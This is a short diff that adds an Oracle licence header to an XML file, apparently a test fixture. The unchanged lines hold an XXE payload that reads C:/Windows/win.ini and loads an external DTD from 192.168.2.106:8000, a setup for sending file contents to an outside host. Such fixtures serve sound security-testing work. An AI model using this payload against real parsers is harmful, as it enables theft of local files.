@@ -1,4 +1,10 @@
-<?xml version="1.0" encoding="utf-8"?>
+<?xml version="1.0"?>
+<!--
+  Copyright (c) 2019, 2020, Oracle and/or its affiliates.
+
+  Licensed under the Universal Permissive License v 1.0 as shown at
+  http://oss.oracle.com/licenses/upl.
+-->
 <!DOCTYPE ANY [
         <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
         <!ENTITY % dtd SYSTEM "http://192.168.2.106:8000/my.dtd">
